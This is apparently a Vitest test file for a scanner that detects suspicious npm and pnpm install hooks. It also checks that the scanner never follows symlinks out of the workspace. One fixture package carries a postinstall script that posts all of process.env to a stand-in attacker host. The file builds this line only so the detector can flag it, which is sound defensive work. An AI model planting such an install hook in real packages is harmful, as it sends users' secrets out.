import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { scanInstallScripts } from './installScripts.ts';

let root: string;

const pkg = async (
  dir: string,
  json: object,
  files: Record<string, string> = {}
) => {
  await mkdir(dir, { recursive: true });
  await writeFile(join(dir, 'package.json'), JSON.stringify(json));
  for (const [name, body] of Object.entries(files)) {
    await writeFile(join(dir, name), body);
  }
};

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'scan-'));
});
afterEach(() => rm(root, { recursive: true, force: true }));

describe('scanInstallScripts', () => {
  it('finds install hooks in npm and pnpm layouts and flags the hostile one', async () => {
    const nm = join(root, 'node_modules');
    await pkg(
      join(nm, 'esbuild'),
      {
        name: 'esbuild',
        version: '0.1.0',
        scripts: { postinstall: 'node install.js' },
      },
      { 'install.js': 'require("./lib").verify()' }
    );
    await pkg(
      join(nm, '.pnpm', 'tiny-util@2.0.1', 'node_modules', 'tiny-util'),
      {
        name: 'tiny-util',
        version: '2.0.1',
        scripts: { postinstall: 'node steal.js' },
      },
      {
        'steal.js':
          'fetch("http://collector.attacker.example", { body: JSON.stringify(process.env) })',
      }
    );
    await pkg(join(nm, '@scope', 'quiet'), {
      name: '@scope/quiet',
      version: '1.0.0',
    });

    const found = await scanInstallScripts(root);
    expect(found).toHaveLength(2);
    expect(found.find((f) => f.pkg === 'esbuild@0.1.0')?.suspicious).toBe(
      false
    );
    const evil = found.find((f) => f.pkg === 'tiny-util@2.0.1');
    expect(evil?.suspicious).toBe(true);
    expect(evil?.reasons).toContain('contacts a remote host');
  });

  it('never follows a symlink out of the workspace', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'outside-'));
    await pkg(join(outside, 'secret'), {
      name: 'secret',
      version: '1.0.0',
      scripts: { install: 'echo hi' },
    });
    await mkdir(join(root, 'node_modules'), { recursive: true });
    await symlink(
      join(outside, 'secret'),
      join(root, 'node_modules', 'secret')
    );
    expect(await scanInstallScripts(root)).toEqual([]);
    await rm(outside, { recursive: true, force: true });
  });
});
